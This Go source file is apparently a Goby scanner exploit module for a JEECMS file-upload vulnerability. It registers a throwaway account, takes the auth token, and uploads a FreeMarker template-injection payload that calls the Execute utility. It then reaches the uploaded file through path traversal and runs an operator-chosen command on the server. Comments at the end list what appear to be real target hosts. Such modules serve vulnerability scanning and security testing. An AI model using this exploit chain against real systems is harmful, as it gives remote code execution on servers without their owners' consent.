package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JEECMS o_upload File Upload",
    "Description": "<p>JEECMS is a content management system (CMS) developed by China Jinlei Technology Development Corporation using Java language.</p><p>There is a security vulnerability in JEECMS, an attacker can register any account and upload a malicious Trojan through the /member/upload/o_upload interface to obtain server permissions.</p>",
    "Product": "JEECMS",
    "Homepage": "http://www.jeecms.com/",
    "DisclosureDate": "2022-08-31",
    "Author": "abszse",
    "FofaQuery": "banner=\"Set-Cookie: JIDENTITY=\" || header=\"Set-Cookie: JIDENTITY=\" || banner=\"JEECMS-Auth-Token\" || header=\"JEECMS-Auth-Token\" || body=\"jeecms\" || body=\"/r/cms/www/default/js/front.js\"",
    "GobyQuery": "banner=\"Set-Cookie: JIDENTITY=\" || header=\"Set-Cookie: JIDENTITY=\" || banner=\"JEECMS-Auth-Token\" || header=\"JEECMS-Auth-Token\" || body=\"jeecms\" || body=\"/r/cms/www/default/js/front.js\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in JEECMS, an attacker can register any account and upload a malicious Trojan through the /member/upload/o_upload interface to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"http://www.jeecms.com/\">http://www.jeecms.com/</a></p>",
    "References": [
        "https://forum.butian.net/share/158"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cmd.exe%20/c%20dir,ls",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "JEECMS o_upload 文件上传漏洞",
            "Product": "JEECMS",
            "Description": "<p>JEECMS是中国金磊科技发展公司的一套使用Java语言开发的内容管理系统（CMS）。<br></p><p>JEECMS 存在安全漏洞，攻击者可注册任意账户并通过/member/upload/o_upload接口上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时关注官网更新：<a href=\"http://www.jeecms.com/\">http://www.jeecms.com/</a><br></p>",
            "Impact": "<p>JEECMS 存在安全漏洞，攻击者可注册任意账户并通过/member/upload/o_upload接口上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "JEECMS o_upload File Upload",
            "Product": "JEECMS",
            "Description": "<p>JEECMS is a content management system (CMS) developed by China Jinlei Technology Development Corporation using Java language.<br></p><p>There is a security vulnerability in JEECMS, an attacker can register any account and upload a malicious Trojan through the /member/upload/o_upload interface to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"http://www.jeecms.com/\">http://www.jeecms.com/</a><br></p>",
            "Impact": "<p>There is a security vulnerability in JEECMS, an attacker can register any account and upload a malicious Trojan through the /member/upload/o_upload interface to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10701"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			RandName := goutils.RandomHexString(6)
			uri1 := "/thirdParty/bind"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Data = fmt.Sprintf(`{"username":"%s","loginWay": 1, "loginType": "QQ", "thirdId": "%s"}`, RandName, RandName)
			cfg1.Header.Store("content-type", "application/json")

			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "JEECMS-Auth-Token") {

				Token := regexp.MustCompile("\"JEECMS-Auth-Token\":\"(.*?)\",").FindStringSubmatch(resp.Utf8Html)
				uri2 := "/member/upload/o_upload"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("JEECMS-Auth-Token", Token[1])
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------1250178961143214655620108952")

				cfg2.Data = fmt.Sprintf("-----------------------------1250178961143214655620108952\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"a.html\"\r\nContent-Type: text/html\r\n\r\n${site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.ObjectWrapper\").getField(\"DEFAULT_WRAPPER\").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.utility.Execute\"), null)(cmd)}\r\n-----------------------------1250178961143214655620108952\r\nContent-Disposition: form-data; name=\"typeStr\"\r\n\r\nFile\r\n-----------------------------1250178961143214655620108952--")
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "fileUrl") {
						fileUrl := regexp.MustCompile("\"fileUrl\":\"(.*?).html\",").FindStringSubmatch(resp2.Utf8Html)
						fileUrl2 := strings.ReplaceAll(fileUrl[1], "/", "-")
						uri3 := "/..-..-..-..-.." + fileUrl2 + ".htm"
						cfg3 := httpclient.NewGetRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.FollowRedirect = false
						if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
							return resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, "freemarker标签")

						}
					}

				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(6)
			uri1 := "/thirdParty/bind"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Data = fmt.Sprintf(`{"username":"%s","loginWay": 1, "loginType": "QQ", "thirdId": "%s"}`, RandName, RandName)
			cfg1.Header.Store("content-type", "application/json")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "JEECMS-Auth-Token") {
				Token := regexp.MustCompile("\"JEECMS-Auth-Token\":\"(.*?)\",").FindStringSubmatch(resp.Utf8Html)
				uri2 := "/member/upload/o_upload"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("JEECMS-Auth-Token", Token[1])
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------1250178961143214655620108952")
				cfg2.Data = fmt.Sprintf("-----------------------------1250178961143214655620108952\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"a.html\"\r\nContent-Type: text/html\r\n\r\n${site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.ObjectWrapper\").getField(\"DEFAULT_WRAPPER\").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass(\"freemarker.template.utility.Execute\"), null)(cmd)}\r\n-----------------------------1250178961143214655620108952\r\nContent-Disposition: form-data; name=\"typeStr\"\r\n\r\nFile\r\n-----------------------------1250178961143214655620108952--")
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "fileUrl") {
						fileUrl := regexp.MustCompile("\"fileUrl\":\"(.*?).html\",").FindStringSubmatch(resp2.Utf8Html)
						fileUrl2 := strings.ReplaceAll(fileUrl[1], "/", "-")
						uri3 := "/..-..-..-..-.." + fileUrl2 + ".htm?cmd=" + cmd
						cfg3 := httpclient.NewGetRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.FollowRedirect = false
						if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
							expResult.Output = resp3.Utf8Html
							expResult.Success = true

						}
					}

				}

			}
			return expResult
		},
	))
}

//http://tequr.cn
//http://121.40.129.57:8080